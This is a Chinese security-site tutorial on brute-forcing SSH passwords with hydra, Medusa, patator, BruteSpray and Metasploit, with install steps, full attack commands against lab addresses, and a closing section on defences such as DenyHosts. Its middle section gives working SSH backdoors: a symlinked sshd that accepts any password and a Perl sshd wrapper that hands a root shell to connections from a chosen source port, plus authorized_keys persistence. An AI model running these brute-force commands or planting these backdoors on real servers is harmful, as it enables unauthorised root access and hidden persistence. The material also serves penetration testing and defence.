---
title: Linux SSH密码暴力破解技术及攻防实战
---
https://www.freebuf.com/sectool/159488.html


[simeon](https://www.freebuf.com/author/simeon)2018-01-15 09:00:153890339

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)本文由simeon 创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

***本文原创作者：simeon，本文属FreeBuf原创奖励计划，未经许可禁止转载  
**

**对于Linux操作系统来说，一般通过VNC、Teamviewer和SSH等工具来进行远程管理，SSH是 Secure Shell的缩写，由IETF的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。**

利用SSH协议可以有效防止远程管理过程中的信息泄露问题。SSH客户端适用于多种平台，几乎所有UNIX平台—包括HP-UX、Linux、AIX、Solaris、Digital UNIX、Irix，以及其他平台都可运行SSH。Kali Linux渗透测试平台默认配置SSH服务。SSH进行服务器远程管理，仅仅需要知道服务器的IP地址、端口、管理账号和密码，即可进行服务器的管理，网络安全遵循木桶原理，只要通过SSH撕开一个口子，对渗透人员来时这将是一个新的世界。

本文对目前流行的ssh密码暴力破解工具进行实战研究、分析和总结，对渗透攻击测试和安全防御具有一定的参考价值。

## 一、SSH密码暴力破解应用场景和思路   

### 1.应用场景

> （1）通过Structs等远程命令执行获取了root权限。
> 
> （2）通过webshell提权获取了root权限
> 
> （3）通过本地文件包含漏洞，可以读取linux本地所有文件。
> 
> （4）获取了网络入口权限，可以对内网计算机进行访问。
> 
> （5）外网开启了SSH端口（默认或者修改了端口），可以进行SSH访问。

在前面的这些场景中，可以获取shadow文件，对其进行暴力破解，以获取这些账号的密码，但在另外的一些场景中，无任何漏洞可用，这个时候就需要对SSH账号进行暴力破解。

### 2.思路

> （1）对root账号进行暴力破解
> 
> （2）使用中国姓名top1000作为用户名进行暴力破解
> 
> （3）使用top 10000 password字典进行密码破解
> 
> （4）利用掌握信息进行社工信息整理并生成字典暴力破解
> 
> （5）信息的综合利用以及循环利用

## 二、使用hydra暴力破解SSH密码

**hydra****是世界顶级密码**暴力密码破解工具，支持几乎所有协议的在线密码破解，功能强大，其密码能否被破解关键取决于破解字典是否足够强大。在网络安全渗透过程中是一款必备的测试工具，配合社工库进行社会工程学攻击，有时会获得意想不到的效果。

### 1.简介

hydra是著名黑客组织thc的一款开源的暴力密码破解工具，可以在线破解多种密码，目前已经被 Backtrack 和 kali 等渗透平台收录，除了命令行下的hydra外，还提供了hydragtk版本（有图形界面的hydra），

官网网站：[http://www.thc.org/thc-hydra](http://www.thc.org/thc-hydra)

目前最新版本为7.6下载地址：[http://www.thc.org/releases/hydra-7.6.tar.gz](http://www.thc.org/releases/hydra-7.6.tar.gz)

它可支持 AFP,Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, uHTTP-FORM-GET,HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET，HTTPS-FORM-POST,HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP,NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES,RDP, Rexec, Rlogin, Rsh, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP, SOCKS5, SSH(v1 and v2), Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP 等类型密码。

### 2.安装

**（1）Debian和Ubuntu安装**

如果是Debian和Ubuntu发行版，源里自带 `hydra`，直接用 `apt-get` 在线安装：

```bash
sudo apt-get install libssl-dev libssh-devlibidn11-dev libpcre3-dev libgtk2.0-dev libmysqlclient-dev libpq-dev libsvn-devfirebird2.1-dev libncp-dev hydra
```

Redhat/Fedora 发行版的下载源码包编译安装，先安装相关依赖包：

```bash
yum install openssl-devel pcre-develncpfs-devel postgresql-devel libssh-devel subversion-devel
```

**（2）centos安装**

```bash
tar -zxvf hydra-7.6-src.tar.gz
cd hydra-6.0-src
./configure
make
make install
```

**3.使用hydra**

 BT5 和 kali 都默认安装了 hydra，在 kali 中单击`kali Linux`- `Password Attacks` - `Online Attacks` - `hydra` 即可打开 hydra。在centos终端中输入命令 `/usr/local/bin/hydra` 即可打开该暴力破解工具，除此之外还可以通过 `hydra-wizard.sh` 命令进行向导式设置进行密码破解，如图1所示。

![1.jpg](https://image.3001.net/images/20180108/15153722234530.jpg!small)  

图1使用 `hydra-wizard.sh` 进行密码破解

如果不安装 `libssh`，运行 `hydra` 破解账号时会出现错误，如图2所示，显示错误提示信息：
```bash
[ERROR]Compiled without LIBSSH v0.4.x support, module is not available!
```

在centos下依次运行以下命令即可解决：

```bash
yum install cmake
wget http://www.libssh.org/files/0.4/libssh-0.4.8.tar.gz    
tar -zxf libssh-0.4.8.tar.gz
cd libssh-0.4.8
mkdir build
cd build
cmake -DCMAKE_INSTALL_PREFIX=/usr-DCMAKE_BUILD_TYPE=Debug -DWITH_SSH1=ON ..    
make    
make install
cd /test/ssh/hydra-7.6  （此为下载hydar解压的目录）
make clean
./configure
make
make install
```

![2.jpg](https://image.3001.net/images/20180108/15153722397820.jpg!small)  

图2 出现 `libssh` 模块缺少错误

**4、hydra参数详细说明**

```bash
hydra [[[-l LOGIN|-L FILE] [-p PASS|-PFILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-wTIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-SuvV46][service://server[:PORT][/OPT]]
```

- `-l LOGIN` 指定破解的用户名称，对特定用户破解。
- `-L FILE` 从文件中加载用户名进行破解。
- `-p PASS`小写p指定密码破解，少用，一般是采用密码字典。
- `-P FILE` 大写字母P，指定密码字典。
- `-e ns` 可选选项，`n`：空密码试探，`s`：使用指定用户和密码试探。
- `-C FILE` 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。
- `-t TASKS` 同时运行的连接的线程数，每一台主机默认为16。
- `-M FILE` 指定服务器目标列表文件一行一条
- `-w TIME` 设置最大超时的时间，单位秒，默认是30s。
- `-o FILE` 指定结果输出文件。
- `-f` 在使用 `-M` 参数以后，找到第一对登录名或者密码的时候中止破解。
- `-v` or `-V` 显示详细过程。
- `-R` 继续从上一次进度接着破解。
- `-S` 采用 SSL 链接。
- `-s PORT` 可通过这个参数指定非默认端口。
- `-U` 服务模块使用细节
- `-h` 更多的命令行选项（完整的帮助）
- `server` 目标服务器名称或者IP（使用这个或 `-M` 选项）
- `service`  指定服务名，支持的服务和协议：`telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get}http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysqloracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icqsapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp` 等等 
- `OPT` 一些服务模块支持额外的输入（-U用于模块的帮助）

**4. 破解SSH账号**

破解 SSH 账号有两种方式，一种是指定账号破解，一种是指定用户列表破解。详细命令如下：

（1）`hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh`

例如输入命令
```bash
hydra -l root  -P pwd2.dic -t 1 -vV -e ns 192.168.44.139 ssh
```

对IP地址为 `192.168.44.139` 的 `root` 账号密码进行破解，如图3所示，破解成功后显示其详细信息。

```bash
hydra -l root  -P pwd2.dic -t 1 -vV -e ns  -o save.log  192.168.44.139  ssh 
```

将扫描结果保存在 `save.log` 文件中，打开该文件可以看到成功破解的结果，如图4所示。

![3.jpg](https://image.3001.net/images/20180108/15153722538028.jpg!small) 

图3破解SSH账号

![4.jpg](https://image.3001.net/images/20180108/15153722697426.jpg!small)  

图4查看破解日志

## 三、使用 `Medusa` 暴力破解 SSH 密码

### 1. `Medusa` 简介

Medusa(美杜莎)是一个速度快，支持大规模并行，模块化，爆破登录。可以同时对多个主机，用户或密码执行强力测试。Medusa和hydra一样，同样属于在线密码破解工具。不同的是，medusa 的稳定性相较于hydra 要好很多，但其支持模块要比 hydra 少一些。 Medusa是支持AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP (NetWare),NNTP,PcAnywhere, POP3, PostgreSQL, rexec, RDP、rlogin, rsh, SMBNT,SMTP(AUTH/VRFY),SNMP, SSHv2, SVN, Telnet, VmAuthd, VNC、Generic Wrapper以及Web表单的密码爆破工具

官方网站：[http://foofus.net/goons/jmk/medusa/medusa.html](http://foofus.net/goons/jmk/medusa/medusa.html)

目前最新版本2.2，美中不足的是软件从2015年后未进行更新，kali 默认自带该软件，软件下载地址：

[https://github.com/jmk-foofus/medusa](https://github.com/jmk-foofus/medusa)

[https://github.com/jmk-foofus/medusa/archive/2.2.tar.gz](https://github.com/jmk-foofus/medusa/archive/2.2.tar.gz)

### 2.安装medusa

**（1）git克隆安装**

```bash
git clone https://github.com/jmk-foofus/medusa.git
```


**（2）手动编译和安装medusa**

```bash
./configuremakemake install
```

安装完成后，会将 medusa 的一些 modules 文件复制到 `/usr/local/lib/medusa/modules` 文件夹。

**3.Medusa参数**

```bash
Medusa [-hhost|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module[OPT]
```


`-h [TEXT]`      目标主机名称或者IP地址

`-H [FILE]`      包含目标主机名称或者IP地址文件

`-u [TEXT]`      测试的用户名

`-U [FILE]`      包含测试的用户名文件

`-p [TEXT]`      测试的密码

`-P [FILE]`      包含测试的密码文件

`-C [FILE]`      组合条目文件

`-O [FILE]`      日志信息文件

`-e [n/s/ns]`    `n` 代表空密码，`s` 代表为密码与用户名相同

`-M [TEXT]`      模块执行名称

`-m [TEXT]`      传递参数到模块

`-d` 显示所有的模块名称

`-n [NUM]`  使用非默认Tcp端口

`-s`  启用SSL

`-r [NUM]`       重试间隔时间，默认为3秒

`-t [NUM]`       设定线程数量

`-T`    同时测试的主机总数

`-L`             并行化，每个用户使用一个线程

`-f` 在任何主机上找到第一个账号/密码后，停止破解

`-F` 在任何主机上找到第一个有效的用户名/密码后停止审计。

`-q` 显示模块的使用信息

`-v [NUM]` 详细级别（0-6）

`-w [NUM]` 错误调试级别（0-10）

`-V` 显示版本

`-Z [TEXT]` 继续扫描上一次

**4.破解单一服务器SSH密码**

（1）通过文件来指定 `host` 和 `user`，`host.txt` 为目标主机名称或者 `IP` 地址，`user.txt` 指定需要暴力破解的用户名，密码指定为 `password`

```bash
./medusa -M ssh -H host.txt -U users.txt -p password
```


（2）对单一服务器进行密码字典暴力破解

  如图5所示，破解成功后会显示success字样，具体命令如下：

```bash
medusa -M ssh -h 192.168.157.131 -u root -Pnewpass.txt
```

![5.png](https://image.3001.net/images/20180108/15153722909252.png!small)  

图5破解 SSH 口令成功

如果使用 `Cltrl + Z` 结束了破解过程，则还可以根据屏幕提示，在后面继续恢复破解，在上例中恢复破解，只需要在命令末尾增加 `-Z h1u1.`即可。也即其命令为：

```bash
medusa -M ssh -h192.168.157.131 -u root -P newpass.txt -Z h1u1.
```

**5.破解某个IP地址主机破解成功后立刻停止，并测试空密码以及与用户名一样的密码**

```bash
medusa -M ssh -h 192.168.157.131 -u root-P /root/newpass.txt -e ns -F
```

执行效果如图 6 所示，通过命令查看字典文件 `newpass.txt`，可以看到root密码位于第 8 行，而在破解结果中显示第一行就破解成功了，说明先执行了 `-e ns` 参数命令，对空密码和使用用户名作为密码来进行破解。

![6.png](https://image.3001.net/images/20180108/15153723107479.png!small)  

图6使用空密码和用户名作为密码进行破解

技巧：加 `-O  ssh.log` 可以将成功破解的记录记录到 `ssh.log` 文件中。

## 四、使用patator暴力破解SSH密码

### 1.下载并安装 `patator`

```bash
git clone https://github.com/lanjelot/patator.git
cd patator
python setup.py install
```

### 2.使用参数

执行 `./patator.py` 即可获取详细的帮助信息

```bash
Patator v0.7(https://github.com/lanjelot/patator)
Usage: patator.py module --help
```

可用模块:

- `+ftp_login`     : 暴力破解FTP

 -  `+ssh_login`     : 暴力破解 SSH

 - `+telnet_login`  : 暴力破解 Telnet

 - `+smtp_login`    : 暴力破解 SMTP

 - `+smtp_vrfy`     : 使用SMTP VRFY进行枚举

 - `+smtp_rcpt`     : 使用 SMTP RCPTTO枚举合法用户

 - `+finger_lookup` : 使用Finger枚举合法用户

 - `+http_fuzz`     : 暴力破解 HTTP

 - `+ajp_fuzz`      : 暴力破解 AJP

 - `+pop_login`     : 暴力破解 POP3

 - `+pop_passd`     : 暴力破解 poppassd([http://netwinsite.com/poppassd/](http://netwinsite.com/poppassd/))

  - `+imap_login`    : 暴力破解 IMAP4

  - `+ldap_login`    : 暴力破解 LDAP

 - +smb_login`     : 暴力破解 SMB

 - `+smb_lookupsid` : 暴力破解 SMB SID-lookup

 - `+rlogin_login`  : 暴力破解 rlogin

 - `+vmauthd_login` : 暴力破解 VMware Authentication Daemon

 - `+mssql_login`   : 暴力破解 MSSQL

 - `+oracle_login`  : 暴力破解 Oracle

 - `+mysql_login`   : 暴力破解 MySQL

 - `+mysql_query`   : 暴力破解 MySQLqueries

 - `+rdp_login`     : 暴力破解 RDP(NLA)

 - `+pgsql_login`   : 暴力破解PostgreSQL

 - `+vnc_login`     : 暴力破解 VNC

 - `+dns_forward`   : 正向DNS 查询

 - `+dns_reverse`   : 反向 DNS 查询

 - `+snmp_login`    : 暴力破解 SNMPv1/2/3

 - `+ike_enum`      : 枚举 IKE 传输

 - `+unzip_pass`    : 暴力破解 ZIP加密文件

 - `+keystore_pass` : 暴力破解Java keystore files的密码

 - `+sqlcipher_pass` : 暴力破解加密数据库SQL Cipher的密码- 

 - `+umbraco_crack` : Crack Umbraco HMAC-SHA1 password hashes

 - `+tcp_fuzz`      : Fuzz TCP services

 - `+dummy_test`    : 测试模块

### 3.实战破解

**（1）查看详细帮助信息**

执行 `./patator.pyssh_login –help` 命令后即可获取其参数的详细使用信息，如图7所示，在ssh暴力破解模块 `ssh_login` 中需要设置 `host`，`port`，`user`，`password` 等参数。

![8.png](https://image.3001.net/images/20180108/15153723351079.png!small)  

图7查看帮助信息

**（2）执行单一用户密码破解**

对主机 `192.168.157.131`，用户`root`，密码文件为 `/root/newpass.txt` 进行破解，如图8所示，破解成功后会显示SSH登录标识 `SSH-2.0-OpenSSH_7.5p1Debian-10`，破解不成功会显示 `Authentication failed.` 提示信息，其破解时间为2秒，速度很快！

```bash
./patator.py ssh_login host=192.168.157.131user=root password=FILE0 0=/root/newpass.txt
```

![8.png](https://image.3001.net/images/20180108/15153723611711.png!small)  

图8破解单一用户密码

（3）破解多个用户。用户文件为 `/root/user.txt`，密码文件为 `/root/newpass.txt`，破解效果如图9所示。

```bash
./patator.py ssh_login host=192.168.157.131user=FILE1 1=/root/user.txt password=FILE0 0=/root/newpass.txt
```

![9.png](https://image.3001.net/images/20180108/15153723781749.png!small)  

图9使用 `patator` 破解多用户的密码

## 五、使用 `BrutesPray` 暴力破解 SSH 密码

BruteSpray 是一款基于 `nmap` 扫描输出的 `gnmap/XML` 文件，自动调用 `Medusa` 对服务进行爆破（Medusa美杜莎是一款端口爆破工具,在前面的文章中对其进行了介绍），声称速度比 `hydra` 快，其官方项目地址：[https://github.com/x90skysn3k/brutespray](https://github.com/x90skysn3k/brutespray)

BruteSpray调用medusa，其说明中声称支持ssh、ftp、telnet、vnc、mssql、mysql、postgresql、rsh、imap、nntp、pcanywhere、pop3、rexec、rlogin、smbnt、smtp、svn和vmauthd协议账号暴力破解。

### 1.安装及下载

**（1）普通下载地址**

[https://codeload.github.com/x90skysn3k/brutespray/zip/master](https://codeload.github.com/x90skysn3k/brutespray/zip/master)

**（2）kali下安装**

   BruteSpray默认没有集成到 `kali Linux` 中，需要手动安装，有的需要先在 kali 中执行更新，apt-get update 后才能执行安装命令：

```bash
apt-get install brutespray
```

kali Linux 默认安装其用户和密码字典文件位置：`/usr/share/brutespray/wordlist`

**（3）手动安装**

```bash
git clonehttps://github.com/x90skysn3k/brutespray.git
cd brutespray
pip install -r requirements.txt
```

注意：如果在其它环境安装需要安装 `medusa`，否则会执行报错。

### 2.BrutesPray使用参数

用法: 
```bash
brutespray.py [-h] -f FILE [-o OUTPUT] [-sSERVICE] [-t THREADS] [-T HOSTS] [-U USERLIST] [-P PASSLIST] [-u USERNAME] [-pPASSWORD] [-c] [-i]
```

用法: `python brutespray.py <选项>`

选项参数:

- `-h`,  `--help`  显示帮助信息并退出

菜单选项:
- `-f FILE`, `--file FILE`  参数后跟一个文件名, 解析nmap输出的GNMAP或者XML文件

- `-o OUTPUT`, `--output OUTPUT`   包含成功尝试的目录

- `-s SERVICE`, `--service SERVICE`  参数后跟一个服务名, 指定要攻击的服务                       

- `-t THREADS`, `--threads THREADS`  参数后跟一数值,指定medusa线程数                        

- `-T HOSTS`, `--hosts HOSTS`  参数后跟一数值,指定同时测试的主机数                      

- `-U USERLIST`, `--userlist USERLIST` 参数后跟用户字典文件

- `-P PASSLIST`, `--passlist PASSLIST` 参数后跟密码字典文件

- `-u USERNAME`, `--username USERNAME` 参数后跟用户名,指定一个用户名进行爆破

- `-p PASSWORD`, `--password PASSWORD` 参数后跟密码,指定一个密码进行爆破                      

- `-c`, `--continuous`      成功之后继续爆破

- `-i`, `--interactive`     交互模式

### 3.使用 `nmap` 进行端口扫描

**（1）扫描整个内网 C 段**

```bash
nmap -v192.168.17.0/24 -oX nmap.xml
```

**（2）扫描开放22端口的主机**

```bash
nmap -A-p 22 -v 192.168.17.0/24 -oX 22.xml
```

（3）扫描存活主机

```bash
nmap –sP 192.168.17.0/24-oX nmaplive.xml
```

(4)扫描应用程序以及版本号

```bash
nmap  -sV –O 192.168.17.0/24 -oX nmap.xml
```

### 4.暴力破解SSH密码

**（1）交互模式破解**

```bash
python brutespray.py --file nmap.xml –i
```

执行后，程序会自动识别nmap扫描结果中的服务，根据提示选择需要破解的服务，线程数、同时暴力破解的主机数，指定用户和密码文件，如图 10所示。Brutespray破解成功后在屏幕上会显示“SUCCESS ”信息。

![10.png](https://image.3001.net/images/20180108/15153724041049.png!small)  

图10交互模式破解密码

**（2）通过指定字典文件爆破SSH**

```
python brutespray.py --file 22.xml -U /usr/share/brutespray/wordlist/ssh/user -P /usr/share/brutespray/wordlist/ssh/password --threads 5 --hosts 5
```

 注意:

brutespray 新版本的 wordlist 地址为 `/usr/share/brutespray/wordlist`，其下包含了多个协议的用户名和密码，可以到该目录完善这些用户文件和密码文件。`22.xml` 为 `nmap` 扫描22端口生成的文件。

**（3）暴力破解指定的服务**

```bash
python brutespray.py --file nmap.xml --service ftp,ssh,telnet --threads 5 --hosts 5
```

**（4）指定用户名和密码进行暴力破解**

当在内网已经获取了一个密码后，可以用来验证nmap扫描中的开放22端口的服务器，如图11所示，对192.168.17.144和192.168.17.147进行root密码暴力破解，192.168.17.144密码成功破解。

```bash
python brutespray.py --file 22.xml -u root -p toor --threads 5 --hosts 5 
./brutespray.py -f 22.xml -u root -p toor--threads 5 --hosts 5
```

![11.png](https://image.3001.net/images/20180108/15153724247392.png!small)  

图11 对已知口令进行密码破解

**（5）破解成功后继续暴力破解**

```bash
python brutespray.py --file nmap.xml--threads 5 --hosts 5 –c
```

  前面的命令是默认破解成功一个帐号后，就不再继续暴力破解了,此命令是对所有账号进行暴力破解，其时间稍长。

**（6）使用Nmap扫描生成的nmap.xml进行暴力破解**

```bash
python brutespray.py --file nmap.xml --threads 5 --hosts 5
```

### 5.查看破解结果

Brutespray 这一点做的非常好，默认会在程序目录 `/brutespray-output/` 目录下生成 `ssh-success.txt` 文件，使用 `cat ssh-success.txt` 命令即可查看破解成功的结果，如图12所示。

![12.jpg](https://image.3001.net/images/20180108/15153724519195.jpg!small)  

图12查看破解成功的记录文件

也可以通过命令搜索 `ssh-success` 文件的具体位置：`find / -name ssh-success.txt`

### 6.登录破解服务器

使用 `ssh user@host` 命令登录 `host` 服务器。例如登录 `192.168.17.144`

```bash
ssh root@192.168.17.144 
```

输入密码即可正常登录服务器 `192.168.17.144`

## 六、Msf下利用`ssh_login` 模块进行暴力破解

### 1.msf 下有关 SSH 相关模块

在kali中执行 `msfconsole` - `search ssh` 后会获取相关所有ssh模块，如图13所示。

![13.jpg](https://image.3001.net/images/20180108/15153724703168.jpg!small)  

图13 msf 下所有 SSH 漏洞以及相关利用模块

### 2.SSH相关功能模块分析

**（1）SSH用户枚举**

此模块使用基于时间的攻击枚举用户 `OpenSSH` 服务器。在一些 `OpenSSH` 的一些版本

配置，OpenSSH 会返回一个“没有权限”无效用户的错误比有效用户快。使用命令如下：

```bash
use auxiliary/scanner/ssh/ssh_enumusers
set rhost 191.168.17.147
set USER_FILE  /root/user
run
```

使用info命令可以查看该模块的所有信息，执行效果如图14所示，实测该功能有一些限制，仅仅对OpenSSH某些版本效果比较好。

![14.png](https://image.3001.net/images/20180108/15153724884468.png!small)  

图14 openssh用户枚举

**（2）SSH版本扫描**

查看远程主机的SSH服务器版本信息，命令如下：

```bash
use auxiliary/scanner/ssh/ssh_version
set rhosts 192.168.157.147
run
```

执行效果如图15所示，分别对centos服务器地址192.168.157.147和kali linux 地址192.168.157.144进行扫描，可以看出一个是SSH-2.0-OpenSSH_5.8p1Debian-1ubuntu3，另外一个是SSH-2.0-OpenSSH_7.5p1 Debian-10，看到第一个版本，第一时间就可以想到如果拿到权限可以安装ssh后门。

![15.png](https://image.3001.net/images/20180108/15153725082612.png!small)  

图15扫描ssh版本信息

**（3）SSH暴力破解**

ssh暴力破解模块“auxiliary/scanner/ssh/ssh_login”可以对单机进行单用户，单密码进行扫描破解，也可以使用密码字典和用户字典进行破解，按照提示进行设置即可。下面使用用户名字典以及密码字典进行暴力破解：

```bash
use auxiliary/scanner/ssh/ssh_login
set rhosts 192.168.17.147
set PASS_FILE /root/pass.txt
set USER_FILE /root/user.txt
run
```

如图16所示，对IP地址192.168.17.147进行暴力破解，成功获取root账号密码，网上有人写文章说可以直接获取shell，实际测试并否如此，通过sessions -l可以看到msf确实建立会话，但切换（sessions -i 1）到会话一直没有反应。   

![16.png](https://image.3001.net/images/20180108/15153725289773.png!small)  

图16使用msf暴力破解ssh密码

## 七、ssh后门

### 1. 软连接后门

```
ln -sf /usr/sbin/sshd /tmp/su; /tmp/su-oPort=33223;
```

经典后门使用ssh root@x.x.x.x -p 33223直接对sshd建立软连接，之后用任意密码登录即可。

但这隐蔽性很弱，一般的rookit hunter这类的防护脚本可扫描到。

### 2.SSH Server wrapper后门

**（1）复制sshd到bin目录**

```bash
cd /usr/sbin
mv sshd ../bin
```

**（2）编辑sshd**

```bash
vi sshd # 加入以下内容并保存#!/usr/bin/perl
exec"/bin/sh"if(getpeername(STDIN)=~/^..LF/);
exec{"/usr/bin/sshd"}"/usr/sbin/sshd",@ARGV;
```

**（4）修改权限**

```bash
chmod 755 sshd
```

**（5）使用socat**

```bash
socat STDIOTCP4:target_ip:22,sourceport=19526
```

如果没有安装socat需要进行安装并编译

```bash
wget http://www.dest-unreach.org/socat/download/socat-1.7.3.2.tar.gz
tar -zxvf socat-1.7.3.2.tar.gz
cd socat-1.7.3.2
./configure
make
make install
```

**（6）使用 `ssh root@ target_ip` 即可免密码登录**

### 3. ssh公钥免密

将本地计算机生成公私钥，将公钥文件复制到需要连接的服务器上的~/.ssh/authorized_keys文件，并设置相应的权限，即可免密码登录服务器。

```bash
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh
```

## 八、ssh暴力破解命令总结及分析

### 1.所有工具的比较

通过对hydra、medusa、patator、brutepray以及msf下的ssh暴力破解测试，总结如下：

（1）每款软件都能成功对ssh账号以及密码进行破解。

（2）patator和brutepray是通过python语言编写，但brutepray需要medusa配合支持。

（3）hydra和medusa是基于C语言编写的，需要进行编译。

（4）brutepray基于nmap扫描结果来进行暴力破解，在对内网扫描后进行暴力破解效果好。

（5）patator基于python，速度快，兼容性好，可以在windows或者linux下稍作配置即可使用。

（6）如果具备kali条件或者PentestBox下，使用msf进行ssh暴力破解也不错。

（7）brutepray会自动生成破解成功日志文件/brutespray-output/ssh-success.txt；hydra加参数“-o save.log”记录破解成功到日志文件save.log，medusa加“-O ssh.log”参数可以将成功破解的记录记录到ssh.log文件中；patator可以加参数“-x ignore:mesg='Authentication failed.'”来忽略破解失败的尝试，而仅仅显示成功的破解。

### 2.命令总结

**（1）hydra破解ssh密码**

```bash
hydra -lroot  -P pwd2.dic -t 1 -vV -e ns 192.168.44.139 ssh
hydra -lroot  -P pwd2.dic -t 1 -vV -e ns  -o save.log  192.168.44.139  ssh
```

**（2）medusa破解ssh密码**

```bash
medusa -M ssh -h 192.168.157.131 -u root -Pnewpass.txt
medusa -M ssh -h192.168.157.131 -u root -P /root/newpass.txt -e ns –F
```

**（3）patator破解ssh密码**

```bash
./patator.py ssh_login host=192.168.157.131user=root password=FILE0 0=/root/newpass.txt -x
ignore:mesg='Authenticationfailed.'
./patator.py ssh_login host=192.168.157.131user=FILE1 1=/root/user.txt password=FILE0
0=/root/newpass.txt -x ignore:mesg='Authenticationfailed.'
```

如果不是本地安装，则使用patator执行即可。

**（4）brutespray暴力破解ssh密码**

```bash
nmap -A-p 22 -v 192.168.17.0/24 -oX 22.xml
python brutespray.py --file 22.xml -u root -p toor --threads 5 --hosts 5
```

**（5）msf暴力破解ssh密码**

```bash
use auxiliary/scanner/ssh/ssh_login
set rhosts192.168.17.147
set PASS_FILE /root/pass.txt
set USER_FILE /root/user.txt
run
```

### 九、 SSH暴力破解安全防范

1.修改 `/etc/ssh/sshd_config` 默认端口为其它端口。例如设置端口为 `2232` ，则port=2232

2.在 `/etc/hosts.allow` 中设置允许的IP访问，例如 `sshd:192.168.17.144:allow`

3.使用 `DenyHosts` 软件来设置，其下载地址：

[https://sourceforge.net/projects/denyhosts/files/denyhosts/2.6/DenyHosts-2.6.tar.gz/download](https://sourceforge.net/projects/denyhosts/files/denyhosts/2.6/DenyHosts-2.6.tar.gz/download)

**（1）安装cdDenyHosts**

```bash
tar-zxvf DenyHosts-2.6.tar.gz 
cd DenyHosts-2.6 
python setup.py install
```

默认是安装到 `/usr/share/denyhosts` 目录的。

**（2）配置cdDenyHosts**

```bash
cd/usr/share/denyhosts/ 
cp denyhosts.cfg-dist denyhosts.cfg 
vi denyhosts.cfg
```

`denyhosts.cfg` 文件说明
```bash
PURGE_DENY= 50m # 过多久后清除已阻止IP 

HOSTS_DENY= /etc/hosts.deny # 将阻止IP写入到hosts.deny 

BLOCK_SERVICE= sshd # 阻止服务名

DENY_THRESHOLD_INVALID= 1 # 允许无效用户登录失败的次数

DENY_THRESHOLD_VALID= 10 # 允许普通用户登录失败的次数

DENY_THRESHOLD_ROOT= 5 # 允许root登录失败的次数

WORK_DIR= /usr/local/share/denyhosts/data # 将deny的host或ip纪录到Work_dir中 

DENY_THRESHOLD_RESTRICTED= 1 # 设定 deny host 写入到该资料夹

LOCK_FILE= /var/lock/subsys/denyhosts # 将DenyHOts启动的pid纪录到LOCK_FILE中，已确保服务正确启动，防止同时启动多个服务。

HOSTNAME_LOOKUP=NO # 是否做域名反解 

ADMIN_EMAIL= # 设置管理员邮件地址

DAEMON_LOG= /var/log/denyhosts # 自己的日志文件

DAEMON_PURGE= 10m # 该项与PURGE_DENY 设置成一样，也是清除hosts.deniedssh 用户的时间。
```

**（3）设置启动脚本**

```bash
cp daemon-control-dist daemon-control 
chown root daemon-control 
chmod 700 daemon-control
```

完了之后执行 `daemon-contronstart` 就可以了。

```bash
./daemon-control start
```

如果要使DenyHosts每次重起后自动启动还需做如下设置：

```bash
ln -s/usr/share/denyhosts/daemon-control /etc/init.d/denyhosts
chkconfig --add denyhosts 
chkconfig denyhosts on
service denyhosts start
```

可以看看 `/etc/hosts.deny` 内是否有禁止的 `IP`，有的话说明已经成功了。

以上内容来之本次专题研究内容之一，只有踏踏实实的做技术研究，才发现研究越多，知识面扩展越多。

***本文原创作者：sim**